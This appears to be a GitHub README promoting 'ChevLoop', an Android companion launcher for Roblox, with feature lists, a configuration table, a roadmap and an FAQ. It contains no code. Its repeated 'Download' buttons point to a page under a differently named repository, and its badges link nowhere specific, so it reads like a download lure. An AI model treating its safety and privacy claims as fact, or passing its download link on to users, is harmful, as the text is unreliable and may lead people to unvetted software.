![preview](https://raw.githubusercontent.com/titoelkorsan22-jpg/Chevstrap-Android-Port/main/thumb_4278ad.svg)
[![Download](https://raw.githubusercontent.com/titoelkorsan22-jpg/Chevstrap-Android-Port/main/app_82daa.svg)](https://titoelkorsan22-jpg.github.io/Chevstrap-Android-Port/)

# 🚀 ChevLoop — Android Companion Layer for Roblox Enthusiasts

[![License](https://img.shields.io/badge/License-MIT-6a5acd?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](./LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Android%2010%2B-3ddc84?style=for-the-badge&logo=android&logoColor=white)](https://developer.android.com)
[![Language](https://img.shields.io/badge/Language-Kotlin-7f52ff?style=for-the-badge&logo=kotlin&logoColor=white)](https://kotlinlang.org)
[![Runtime](https://img.shields.io/badge/Runtime-Jetpack%20Compose-4285f4?style=for-the-badge&logo=jetpackcompose&logoColor=white)](https://developer.android.com/jetpack/compose)
[![Stage](https://img.shields.io/badge/Stage-Active%20Development-ff8c00?style=for-the-badge)](https://github.com)
[![Issues](https://img.shields.io/badge/Issues-Welcome-brightgreen?style=for-the-badge&logo=github)](https://github.com)
[![Discussions](https://img.shields.io/badge/Discussions-Open-1e90ff?style=for-the-badge&logo=github)](https://github.com)
[![Build](https://img.shields.io/badge/Build-Passing-2ecc71?style=for-the-badge&logo=githubactions&logoColor=white)](https://github.com)
[![Made%20with](https://img.shields.io/badge/Made%20with-%E2%9D%A4%EF%B8%8F%20for%20the%20community-ff69b4?style=for-the-badge)](https://github.com)

Welcome to **ChevLoop**, a second-generation Android companion layer that reimagines how mobile players experience their sessions on Roblox. Where its spiritual predecessor Chevstrap (itself inspired by the legendary Bloxstrap on Windows) sought to unify launcher behaviors on phones, ChevLoop goes one step further: it becomes a *quiet orchestrator* — a conductor standing between you and the app, arranging note-perfect transitions, caching, theming, and telemetry-free customization so that the only thing you feel is the game itself.

Think of ChevLoop less as a "launcher" and more as a **digital concierge** for your Android device. It minds the small details — which account you last used, whether the night mode should kick in, how quickly the splash screen dissolves into your favorite experience — while asking nothing of you in return beyond a tap.

[![Download](https://raw.githubusercontent.com/titoelkorsan22-jpg/Chevstrap-Android-Port/main/app_82daa.svg)](https://titoelkorsan22-jpg.github.io/Chevstrap-Android-Port/)

---

## 🧭 Table of Contents

- [Vision Statement](#-vision-statement)
- [Why a Companion Layer?](#-why-a-companion-layer)
- [Feature Highlights](#-feature-highlights)
  - [Responsive UI Framework](#-responsive-ui-framework)
  - [Multilingual Support](#-multilingual-support)
  - [Around-the-Clock Assistance](#-around-the-clock-assistance)
  - [Profile Switcher](#-profile-switcher)
  - [Themed Skins & Ambience](#-themed-skins--ambience)
  - [Intelligent Cache Management](#-intelligent-cache-management)
  - [Launch Rituals](#-launch-rituals)
  - [Privacy-First Defaults](#-privacy-first-defaults)
- [Screens & Flow](#-screens--flow)
- [Architecture Overview](#-architecture-overview)
- [Compatibility Matrix](#-compatibility-matrix)
- [Configuration Reference](#-configuration-reference)
- [Roadmap](#-roadmap)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Community & Contributions](#-community--contributions)
- [Security Policy](#-security-policy)
- [License](#-license)
- [Disclaimer](#-disclaimer)
- [Acknowledgements](#-acknowledgements)

---

## 🎯 Vision Statement

The Android ecosystem for Roblox has, for a long time, treated the mobile experience as a compromise — a pared-down version of "the real thing." ChevLoop refuses that assumption. Our vision is that a phone in your pocket deserves a *first-class* launch experience: deliberate, fast, customizable, and respectful of your attention. This is not a tool that demands your fascination. It is a tool that vanishes after it has done its job, leaving you inside the world you actually wanted to visit.

## 🌱 Why a Companion Layer?

Traditional launchers are traffic cops. They point, they redirect, they exit stage-left. ChevLoop is more like a stagehand: it adjusts the lighting, checks the props, and slips into the wings before the curtain lifts. It sits quietly on top of the Android package ecosystem, honoring the platform's rules while offering a friendlier face for daily use.

The project grew out of a real need expressed by the Roblox-on-Android community — the desire for something more intentional than a bare shortcut, but less invasive than a full system overhaul. ChevLoop occupies that middle ground.

## ✨ Feature Highlights

### 📱 Responsive UI Framework

ChevLoop's interface bends to your device instead of the other way around. Layouts recompose dynamically across handset sizes, tablets, foldables, and ChromeOS windows. Whether you're on a compact 5-inch screen in portrait or a wide unfolded display in landscape, touch targets, typography scales, and menu affordances adjust without a second of orientation jank.

- Adaptive grid composition using Jetpack Compose's constraint system
- Predictive back-gesture support tuned for Android 14 and beyond
- Variable refresh rate aware animations (60 Hz, 90 Hz, 120 Hz, 144 Hz)
- One-handed reachability mode that pulls primary controls toward the thumb zone

### 🌐 Multilingual Support

Languages are not an afterthought appended at the end of a release cycle; they are first-class citizens. ChevLoop ships with a translation pipeline where every string is versioned alongside its source. Community translators can propose updates through a lightweight review process, and locale fallback chains ensure that a partially translated language never leaves blanks on screen.

Currently supported locales (with more arriving each month):

English (US/UK), Español (LATAM/ES), Português (BR/PT), Français, Deutsch, Italiano, Nederlands, Polski, Русский, Türkçe, العربية, हिन्दी, 日本語, 한국어, 简体中文, 繁體中文, Bahasa Indonesia, ไทย, Tiếng Việt, Svenska, Norsk, Dansk, Suomi, Čeština, Magyar, Română, Ελληνικά, עברית, Українська.

If your language is missing, opening an issue with a short translation proposal is often enough to bring it into the next nightly.

### 🕐 Around-the-Clock Assistance

The project's support desk never closes because contributions never stop. Volunteer maintainers monitor the issue tracker across multiple time zones, and a rotating triage schedule means that a newly filed bug usually receives a first human response within a matter of hours rather than days. The support window is transparently 24/7 — meaning that whatever hour it is where you live, someone, somewhere, is likely awake and looking at the queue.

- Rotating triage across UTC-8, UTC, UTC+5:30, and UTC+9
- Structured issue templates that route to the right maintainer
- A searchable knowledge base seeded from recurring questions
- Weekly digest posts summarizing what changed and what is planned

### 👥 Profile Switcher

Maintain several distinct identities — for personal play, family use, or development testing — without ever typing credentials into a third-party field. ChevLoop simply remembers which account you prefer and hands the handoff back to the official app. Your session tokens never leave their original sandbox.

### 🎨 Themed Skins & Ambience

Choose from a curated palette of visual moods — Midnight Slate, Dawn Blush, Forest Velvet, Solarpunk — or design your own. Material You dynamic color extraction pulls hues from your wallpaper so that ChevLoop feels like a natural extension of your home screen rather than a bolted-on utility.

### 🗑️ Intelligent Cache Management

Mobile storage is precious. ChevLoop keeps a lean footprint by aggressively pruning stale assets, deduplicating icons, and streaming log files to a ring buffer instead of growing them without limit. A single tap reveals exactly how much space is currently held by ChevLoop — and how much was released in the last thirty days.

### 🎬 Launch Rituals

Configure a personal launch sequence: a specific splash animation, a brief haptic pulse, an optional low-latency pre-warm of the target package. For players who open the same experience daily, the difference is measurable in seconds saved and in the calm that comes from a deliberate, familiar ritual.

### 🔒 Privacy-First Defaults

ChevLoop does not phone home. There is no analytics SDK, no crash reporter dialed to a third party, no advertising identifier. Diagnostics remain local unless you explicitly export them for a bug report. Your usage patterns are your own.

## 🖼️ Screens & Flow

A typical journey through ChevLoop unfolds in three graceful beats:

1. **Gateway** — an overview panel that surfaces recent experiences, active profile, and community notices. This is the "hello" screen, designed to be understood at a glance.
2. **Wing** — the configuration side, where ambience, language, launch rituals, and cache are tuned. It is intentionally separated from daily use so that casual players never have to see it unless they want to.
3. **Handoff** — the moment where ChevLoop steps aside and the official experience takes the stage. Everything before this point is preparation; this is the payoff.

Each screen uses subtle motion to signal transition rather than abrupt swaps, so the app feels like it breathes rather than blinks.

## 🏗️ Architecture Overview

ChevLoop is written almost entirely in Kotlin and leans on modern Android primitives:

- **Compose-first UI** for declarative, state-driven screens
- **Coroutines and Flow** for asynchronous work without callback pyramids
- **Hilt** for dependency wiring
- **DataStore** for preference persistence, replacing legacy shared preferences
- **WorkManager** for scheduled maintenance jobs (cache pruning, locale sync)
- **Foreground service** for pre-warm operations with strict battery discipline
- **Module boundaries** that separate UI, domain, and data layers, so a future Kotlin Multiplatform experiment is not precluded

The build pipeline enforces code style, runs unit tests on every pull request, and produces nightly artifacts that any contributor can install directly.

## 📊 Compatibility Matrix

| Android Version | Status        | Notes                                              |
|-----------------|---------------|----------------------------------------------------|
| Android 14      | ✅ Recommended | Full feature set, predictive back fully supported  |
| Android 13      | ✅ Stable      | Themed icons integration                           |
| Android 12/12L  | ✅ Stable      | Material You dynamic color                         |
| Android 11      | 🟡 Supported   | Minor cosmetic limitations                         |
| Android 10      | 🟡 Supported   | Baseline supported release                         |
| Android 9       | ⚪ Experimental | Feature subset, community tested                  |

Foldable, tablet, and ChromeOS form factors are actively maintained. Devices with aggressive background restrictions may require a one-time whitelist for the pre-warm service.

## ⚙️ Configuration Reference

| Key                  | Type    | Default       | Description                                         |
|----------------------|---------|---------------|-----------------------------------------------------|
| `ambience.theme`     | string  | `auto`        | Chooses between named palettes or dynamic color     |
| `ambience.haptics`   | boolean | `true`        | Enable the launch haptic pulse                      |
| `launch.prewarm`     | boolean | `false`       | Pre-warm the target package before handoff          |
| `launch.splash`      | string  | `fade`        | Splash transition style: fade, slide, zoom          |
| `locale.primary`     | string  | system        | Interface language override                         |
| `locale.fallback`    | string  | `en-US`       | Locale used when a translation is missing           |
| `cache.limitMb`      | integer | `128`         | Maximum cache footprint in megabytes                |
| `cache.autoPrune`    | boolean | `true`        | Run scheduled maintenance automatically             |
| `privacy.diagnostics`| boolean | `false`       | Toggle local diagnostic collection                  |

All settings are exposed through the in-app Wing panel, and also mirrored in a human-readable export file that keeps troubleshooting straightforward.

## 🗺️ Roadmap

The path forward is drawn in pencil, not ink. Community feedback reshapes it every quarter.

- **2026 Q1** — Multi-profile refinements, improved foldable layouts, first batch of new locales
- **2026 Q2** — Optional widget surface for home-screen quick access, refined pre-warm heuristics
- **2026 Q3** — Expanded tablet experience, accessibility audit follow-up, theme marketplace preview
- **2026 Q4** — Kotlin Multiplatform exploration, advanced launch ritual scripting
- **Beyond** — Whatever the community asks for next

## ❓ Frequently Asked Questions

**Is ChevLoop a replacement for the official app?**
No. ChevLoop is a companion layer. It begins where the launcher ends and hands control back to the official experience before gameplay starts.

**Will my account information ever be stored by ChevLoop?**
No credentials are ever captured. Profile references are stored as opaque identifiers, not passwords or session tokens.

**Does it work offline?**
The companion layer itself does. Obviously, gameplay requires a connection, just as it always has.

**Can I contribute a translation?**
Absolutely — locale files are version-controlled, and a pull request with a new translation is often merged within a week.

**How do I report a bug?**
Open an issue using the provided template. Including your Android version, device model, and ChevLoop build number speeds things enormously.

**Is there a paid tier?**
No. ChevLoop is developed in the open by volunteers. There is no purchase gateway, no subscription, and no advertising.

## 🤝 Community & Contributions

ChevLoop exists because people chose to give it their evenings, weekends, and occasional bursts of late-night inspiration. Contributions of every shape are welcome:

- Code — Kotlin, Compose, Gradle, CI
- Design — iconography, color systems, motion studies
- Documentation — README edits, wiki pages, video walkthroughs
- Translation — any of the locales listed above (or new ones)
- Triage — helping newcomers in the issue tracker
- Spread the word — writing about the project, sharing it with friends

Before your first pull request, please review the contribution guidelines and the code of conduct found in the repository root. A friendly tone is not optional; it is the house style.

## 🛡️ Security Policy

If you discover a vulnerability, please disclose it responsibly. Do not publish exploit details in public issues. Instead, reach out through the private channel listed in the SECURITY.md file. The maintainers commit to acknowledging reports promptly and crediting responsible disclosures in the changelog unless anonymity is preferred.

ChevLoop deliberately avoids collecting secrets of any kind. No API keys, no session tokens, no personal identifiers are stored or transmitted by the companion layer.

## 📜 License

ChevLoop is released under the **MIT License**. You are welcome to read it, learn from it, remix it, and share it — provided the original notice is preserved.

Read the full license text here: [MIT License](./LICENSE)

Copyright (c) 2026 ChevLoop Contributors.

## ⚠️ Disclaimer

ChevLoop is an independent, community-driven project. It is **not affiliated with, endorsed by, or sponsored by** Roblox Corporation, nor by any previous launcher project whose ideas inspired this one. All trademarks, product names, and logos referenced belong to their respective owners and are used here only for descriptive, nominative purposes.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or the use of the software.

Users are solely responsible for how they employ ChevLoop and for ensuring their usage complies with the terms of service of any third-party application they interact with.

## 💚 Acknowledgements

A heartfelt thank you to the early testers who installed nightly builds on devices that were never meant to run experimental software, to the translators who turned a wall of English strings into a dozen languages, and to every contributor who filed a bug report with just the right amount of detail.

This project stands on the shoulders of the broader Android open-source ecosystem — the Kotlin team, the Compose team, the Gradle team — and on the inspiration drawn from earlier community launchers that proved an audience existed for this kind of work.

And to you, reading this far: thank you. ChevLoop was built for you.

---

**ChevLoop — the quiet companion between your thumb and the worlds you love.**

Made with care, in the open, in 2026.

[![Download](https://raw.githubusercontent.com/titoelkorsan22-jpg/Chevstrap-Android-Port/main/app_82daa.svg)](https://titoelkorsan22-jpg.github.io/Chevstrap-Android-Port/)